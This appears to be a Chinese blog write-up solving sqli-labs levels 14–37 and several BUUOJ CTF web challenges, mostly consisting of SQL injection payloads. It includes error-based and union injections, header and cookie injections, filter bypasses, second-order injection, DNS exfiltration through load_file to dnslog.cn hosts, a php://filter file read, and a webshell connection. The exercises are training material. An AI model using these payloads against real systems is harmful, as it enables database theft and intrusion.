<p><img src="https://img-blog.csdnimg.cn/20210208115425692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>测试显示点发现，这题没有显示点</p>
<blockquote>
<p>-1’) union select 1,2 #</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210208115804234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">所以准备用报错注入</p>
<blockquote>
<p>-1’) union select updatexml(1,concat(“~”,user(),”—“),1) #</p>
</blockquote>
<p>注入成功<br><img src="https://img-blog.csdnimg.cn/2021020812002514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-14-基于”-的报错注入"><a href="#Less-14-基于”-的报错注入" class="headerlink" title="Less-14-基于”  的报错注入"></a>Less-14-基于”  的报错注入</h1><p>根据题目知道，这题是双引号闭合<br>于是构造payload</p>
<blockquote>
<p>1” or 1=1 #</p>
</blockquote>
<p>成功进入<br><img src="https://img-blog.csdnimg.cn/20210208120148961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>与上题一样，没有显示点</p>
<blockquote>
<p>-1” union select 1,2 #</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210208120244193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>于是使用报错注入</p>
<blockquote>
<p>-1” union select updatexml(1,concat(“<del>“,user(),”</del>“),1) #</p>
</blockquote>
<p>成功注入<br><img src="https://img-blog.csdnimg.cn/20210208120357507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-15-基于’-的POST型注入"><a href="#Less-15-基于’-的POST型注入" class="headerlink" title="Less-15-基于’ 的POST型注入"></a>Less-15-基于’ 的POST型注入</h1><p>根据提示可知，这题是用的布尔盲注，所以可以尝试使用dns传值<br>首先构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and load_file(concat(&quot;\\\\&quot;,(database()),&quot;.rao80k.dnslog.cn\\1.txt&quot;)) #</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021020911571117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20210209115721303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">成功传值</p>
<h1 id="Less-16-基于”-的POST型注入"><a href="#Less-16-基于”-的POST型注入" class="headerlink" title="Less-16-基于”) 的POST型注入"></a>Less-16-基于”) 的POST型注入</h1><p>这题同上，可以用dns传值<br>构造一下payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&quot;) and load_file(concat(&quot;\\\\&quot;,(database()),&quot;.e8vwb8.dnslog.cn\\1.txt&quot;)) #</span><br></pre></td></tr></table></figure>
<p>tips：最开始用1”) 发现一直注入不成功<br>后来仔细看的时候突然发现mysql注入的值是username<br>前几题都能行，所以一时间没看出来ε = = (づ′▽`)づ<br><img src="https://img-blog.csdnimg.cn/20210209133959999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-17-基于’-的密码注入"><a href="#Less-17-基于’-的密码注入" class="headerlink" title="Less-17-基于’ 的密码注入"></a>Less-17-基于’ 的密码注入</h1><p>这题刚开始的时候用老套路在username那整了好一会，发现怎么都注入不成功，然后突然发现上方有一个[PASSWORD RESET]<br>才反应过来这题可能是从password中注入，老眼瞎了(ˇωˇ」∠)_<br>试着构造了一下payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) #</span><br></pre></td></tr></table></figure>
<p>tips：这题使用了update函数，所以username得是正确的，这里以admin为例</p>
<p><img src="https://img-blog.csdnimg.cn/20210210111924293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-18-基于’-的user-agent报头文件注入"><a href="#Less-18-基于’-的user-agent报头文件注入" class="headerlink" title="Less-18-基于’ 的user-agent报头文件注入"></a>Less-18-基于’ 的user-agent报头文件注入</h1><p>这关不看源代码感觉还真不好整，瞎吉尔整了半天，结果一看源代码才知道是用user-agent报头文件注入的<em>(:3⌒ﾞ)</em><br>正好是第一次遇见这种类型题，去找了一下大致解法<br>由于锁username和password了，所以要先知道username和password才可以进行下一步<br>于是使用burpsuite爆破用户名和密码（这种方法其实并不实用<br><img src="https://img-blog.csdnimg.cn/20210210215719507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>爆破出用户名、密码，然后进行user-agent注入<br>这里给出payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;,1,updatexml(1,concat(0x7e,database(),0x7e),1)) #</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021021022004258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-19-基于’-的referer报头文件注入"><a href="#Less-19-基于’-的referer报头文件注入" class="headerlink" title="Less-19-基于’ 的referer报头文件注入"></a>Less-19-基于’ 的referer报头文件注入</h1><p>这题跟上题一样，但是是referer的报头文件注入<br>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;,updatexml(1,concat(0x7e,database(),0x7e),1)) #</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210210220649426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-20-基于’-的cookie注入"><a href="#Less-20-基于’-的cookie注入" class="headerlink" title="Less-20-基于’ 的cookie注入"></a>Less-20-基于’ 的cookie注入</h1><p>这题是真的整了好久，刚看到这题的时候我以为跟前几道报头注入的题一样，更改一下报头就行了，但是尝试了好一会发现不行。＿|￣|○<br>于是感觉可能是代码更改过了，跟前几题的代码不一样，所以去看了一下源代码，发现确实不一样了，闭合点改了，所以重新修改了一下payload交上去发现还是不行。(｀Д´*)<br>最后选择去看了看网上的payload，发现是因为这题username,password,submit都限定了，只要提交了username和password就进不去注入点，由于我是用burpsuite的重发器进行payload测试的，所以一直卡在那里。┐(￣ヮ￣)┌<br>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;&#39;union select 1,2,(updatexml(1,concat(0x7e,database(),0x7e),1)) #;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210210222517580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-21-基于’-的cookie注入"><a href="#Less-21-基于’-的cookie注入" class="headerlink" title="Less-21-基于’ 的cookie注入"></a>Less-21-基于’ 的cookie注入</h1><p>这关根据提示可以知道，是和20关一样是用cookie进行注入，于是构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;) and updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210212161718460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">发现回显错误，并且是乱码，第一次遇到这种类型题，也不知道是为啥乱码。(:3_ヽ)_<br>于是决定去看一眼源代码，发现在交sql语句之前进行了一次base64解码才交到query的。<br><img src="https://img-blog.csdnimg.cn/20210212161934107.png"><br>所以拿payload去进行一次base64编码<br><img src="https://img-blog.csdnimg.cn/20210212162035826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">然后再交一次<br><img src="https://img-blog.csdnimg.cn/20210212162116623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">注入成功辣。</p>
<h1 id="Less-22-基于”-的cookie注入"><a href="#Less-22-基于”-的cookie注入" class="headerlink" title="Less-22-基于” 的cookie注入"></a>Less-22-基于” 的cookie注入</h1><p>这关和上一关一样，只不过注入语句从’) 变为了’ “<br>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210212162427239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-23-过滤注释符的GET注入"><a href="#Less-23-过滤注释符的GET注入" class="headerlink" title="Less-23-过滤注释符的GET注入"></a>Less-23-过滤注释符的GET注入</h1><p>这关跟第一关一样，是简单的GET注入，不过把注释符过滤掉了，但是我们可以选择用一个单引号把后边的那个单引号闭合一下就行了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#39; union select 1,2,3 &#39; 1</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021021216480899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-24-基于’-的二次注入"><a href="#Less-24-基于’-的二次注入" class="headerlink" title="Less-24-基于’ 的二次注入"></a>Less-24-基于’ 的二次注入</h1><p>这一关的提示是二次注入，去看看万能的网友的解释，二次注入其实就是使用一个账户来更改其他账户的用户名和密码。<br>在看看pass-change的源代码，知道可以从update这里入手。<br>我们先新建一个带有注入效果的用户名<br><img src="https://img-blog.csdnimg.cn/20210212170757731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<p>然后登入更改密码<br><img src="https://img-blog.csdnimg.cn/20210212170831823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">然后就可以使用刚刚更改的密码登入admin的用户了<br><img src="https://img-blog.csdnimg.cn/20210212170911868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">最后解释下原理，这关二次注入的原理其实就是把使用一个带注释符的用户名<br>把原来的update sql注入语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39; </span><br></pre></td></tr></table></figure>
<p>通过带有注释符的用户名变为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39; -- - &#39; and password&#x3D;&#39;$curr_pass&#39; </span><br></pre></td></tr></table></figure>
<p>于是后面的password认证就被注释掉了<br>最后就变成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;</span><br></pre></td></tr></table></figure>
<h1 id="Less-25-禁止and和or的注入"><a href="#Less-25-禁止and和or的注入" class="headerlink" title="Less-25-禁止and和or的注入"></a>Less-25-禁止and和or的注入</h1><p>这关进来后得到提示，我们的and 和 or 都被禁止了，所以可以考虑使用联合注入<br>这里是payload</p>
<blockquote>
<p>id=-1’ union select 1,2,3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210214141956339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70" alt="="></p>
<h1 id="Less-25a-禁止and和or的注入"><a href="#Less-25a-禁止and和or的注入" class="headerlink" title="Less-25a-禁止and和or的注入"></a>Less-25a-禁止and和or的注入</h1><p>这关跟上一关一样，但是注入点改为了无限制注入<br>这里是payload</p>
<blockquote>
<p>id=-1 union select 1,2,3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210214142247503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-26-过滤了空格和注释的注入"><a href="#Less-26-过滤了空格和注释的注入" class="headerlink" title="Less-26-过滤了空格和注释的注入"></a>Less-26-过滤了空格和注释的注入</h1><p>这关把空格和注释过滤掉了，所以我们可以选择使用单引号闭合后面的单引号<br>由于过滤and和or的机制是and = “”<br>所以我们可以这样子绕过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aandnd</span><br></pre></td></tr></table></figure>
<p>当里面的and被过滤成空了之后，两边合在一起就变成了一个新的and<br>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1&#39;aandnd(updatexml(1,concat(0x7e,database(),0x7e),1))aandnd&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210214151612998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-27-过滤了union和select的注入"><a href="#Less-27-过滤了union和select的注入" class="headerlink" title="Less-27-过滤了union和select的注入"></a>Less-27-过滤了union和select的注入</h1><p>这关把union和select过滤掉了，但没啥事，我们前几关都在用报错注入，所以这一关也一样<br>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1&#39;and(updatexml(1,concat(0x7e,database(),0x7e),1))and&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210214155612387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-28-过滤了union和select的注入，且报错注入不可用"><a href="#Less-28-过滤了union和select的注入，且报错注入不可用" class="headerlink" title="Less-28-过滤了union和select的注入，且报错注入不可用"></a>Less-28-过滤了union和select的注入，且报错注入不可用</h1><p>这关是过滤了union和select的注入，所以进来第一时间想到了报错，结果发现报错不可用，因为报错点被注释掉了，查了查发现可以用转编码<br>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编码前</span><br><span class="line">-1&#39;) UnIon All Select (&#39;1&#39;),2,(&#39;3</span><br><span class="line">编码后</span><br><span class="line">999%27)%0AUnIon%0AAll%0ASelect%0A(%271%27),2,(%273</span><br><span class="line">tips：%0A是换行符</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210216140251280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-29-基于’-的字符型注入"><a href="#Less-29-基于’-的字符型注入" class="headerlink" title="Less-29-基于’ 的字符型注入"></a>Less-29-基于’ 的字符型注入</h1><p>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;999&#39; union select 1,2,3 %23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/202102161406411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-30-基于”-的字符型注入"><a href="#Less-30-基于”-的字符型注入" class="headerlink" title="Less-30-基于” 的字符型注入"></a>Less-30-基于” 的字符型注入</h1><p>这关跟上一关一样，但是变成了”<br>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;999&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3%23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021021614155615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-31-基于”-的字符型注入"><a href="#Less-31-基于”-的字符型注入" class="headerlink" title="Less-31-基于”) 的字符型注入"></a>Less-31-基于”) 的字符型注入</h1><p>这关也没过滤啥<br>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;999&quot;) union select 1,2,3 %23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210217161755650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-32-基于’-的宽字节注入"><a href="#Less-32-基于’-的宽字节注入" class="headerlink" title="Less-32-基于’ 的宽字节注入"></a>Less-32-基于’ 的宽字节注入</h1><p>这关用反斜杠 / 把’ 和 “ 转义掉了，所以直接使用的话是不能闭合的，那么我们可以试一下宽字节注入<br>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;999%df&#39; union select 1,2,3 %23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210218141253620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h1><p>这关跟上一关一样，只不过是用了php内的函数来进行反斜杠转义，也可以使用宽字节注入。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;999%df&#39; union select 1,2,3 %23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210218141554168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-34-POST方式的宽字节注入"><a href="#Less-34-POST方式的宽字节注入" class="headerlink" title="Less-34-POST方式的宽字节注入"></a>Less-34-POST方式的宽字节注入</h1><p>这关也是宽字节注入，但是注入方式变为了POST型注入<br>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1�&#39; union select 1,2 -- </span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021021819393675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-35-数值型注入"><a href="#Less-35-数值型注入" class="headerlink" title="Less-35-数值型注入"></a>Less-35-数值型注入</h1><p>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;999 union select 1,2,3 %23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210218194057972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-36-基于’-的宽字节注入"><a href="#Less-36-基于’-的宽字节注入" class="headerlink" title="Less-36-基于’ 的宽字节注入"></a>Less-36-基于’ 的宽字节注入</h1><p>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;999%df&#39; union select 1,2,3 %23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210218194250953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-37-基于POST型的宽字节注入"><a href="#Less-37-基于POST型的宽字节注入" class="headerlink" title="Less-37-基于POST型的宽字节注入"></a>Less-37-基于POST型的宽字节注入</h1><p>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">999�&#39; union select 1,2 -- </span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210218194420881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>sql-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUOJ-Web-1pts</title>
    <url>/2021/03/11/WriteUp/BUUOJ%20web%201pts/</url>
    <content><![CDATA[<p>BUUOJ-Web WriteUp</p>
<a id="more"></a>
<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>简单的sql注入</p>
<p>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure>
<p>可以登陆进去之后直接看到flag</p>
<p><img src="https://i.loli.net/2021/03/11/4BYLC9cDZv7ztT2.png"></p>
<blockquote>
<p>flag{2c793226-369d-4941-af62-10463af21b6c}</p>
</blockquote>
<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>尝试了各种姿势后发现可以用堆叠注入</p>
<p>爆库名</p>
<blockquote>
<p>1’;show databases;#</p>
</blockquote>
<p><img src="https://i.loli.net/2021/03/11/oBOT9y7iNzrgacA.png"></p>
<p>爆表名</p>
<blockquote>
<p>1’;show tables;#</p>
</blockquote>
<p><img src="https://i.loli.net/2021/03/11/A7j2dthgLny8iQC.png"></p>
<p>爆列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;# #爆1919810931114514表</span><br><span class="line">1&#39;;show columns from &#96;words&#96;;# #爆words表</span><br></pre></td></tr></table></figure>
<p>发现id在words表中，那么咱只需要改个表名就行了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;; # 把表words更名为words1</span><br><span class="line">rename tables &#96;1919810931114514&#96; to &#96;words&#96;; # 把表1919810931114514更名为words</span><br><span class="line">alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100); # 把words中的列名flag更名为id</span><br></pre></td></tr></table></figure>
<p>然后只要登入就可以看到flag了</p>
<blockquote>
<p>1’ or 1=1 #</p>
</blockquote>
<p><img src="https://i.loli.net/2021/03/11/S1cdzKsJLBnDA5P.png"></p>
<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>打开看见一只可爱的小猫</p>
<p>直接进入ctrl + U看源代码，在下面发现藏东西了</p>
<p><img src="https://i.loli.net/2021/03/11/pYXv52zRePSgiOu.png"></p>
<p>按着GET一个cat变量，出现flag</p>
<p><img src="https://i.loli.net/2021/03/11/4sCJkcIQWBzdv9p.png"></p>
<blockquote>
<p>flag{04dfe2f2-bbf0-43f3-9bf1-faab0790de78}</p>
</blockquote>
<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>ctrl+U发现一个Archive_room.php</p>
<p>用burpsuite抓一下包，发现一个secr3t.php</p>
<p><img src="https://i.loli.net/2021/03/13/2pXDMTH8ZsvziE4.png"></p>
<p>发现是一段简单的代码审计和文件包含</p>
<p>咱可以用伪协议</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/03/13/gCqDYKie7H3RVP2.png"></p>
<p>得到一串base64编码，解码即可得到flag</p>
<blockquote>
<p>flag{d67ab513-7a2d-4e45-a27a-99486f6f99ee}</p>
</blockquote>
<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>进去后发现是简单的sql注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select 1,2,3 # # 查看回显</span><br><span class="line">-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),3 # #爆表名</span><br><span class="line">-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;l0ve1ysq1&#39;),3 # # 爆列名</span><br><span class="line">-1&#39; union select 1,(select group_concat(concat_ws(0x7e, username, password)) from l0ve1ysq1),3 # #爆数据</span><br></pre></td></tr></table></figure>
<p>最后得到flag</p>
<blockquote>
<p>flag{94e175f4-807f-404e-a433-65501ae8595b}</p>
</blockquote>
<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>这题提示已经POST了一个一句话木马</p>
<p>直接用蚁剑连接</p>
<p><img src="https://i.loli.net/2021/03/13/KYiDsjup9zoFG7b.png"></p>
<p>  得到flag</p>
<blockquote>
<p>flag{46dce079-289a-4494-98da-139ce0e08a9a}</p>
</blockquote>
<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p> ctrl+U发现一个secret.php</p>
<p>进入后依照提示逐一添加header</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Referer: https://www.Sycsecret.com</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">X-Forwarded-For: localhost</span><br></pre></td></tr></table></figure>
<p>即可得到flag</p>
<blockquote>
<p>flag{da768d87-8706-4596-bf42-71c1b8fa6453}</p>
</blockquote>
<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>有提示可以知道有网站备份文件</p>
<p>运用脚本进行扫描</p>
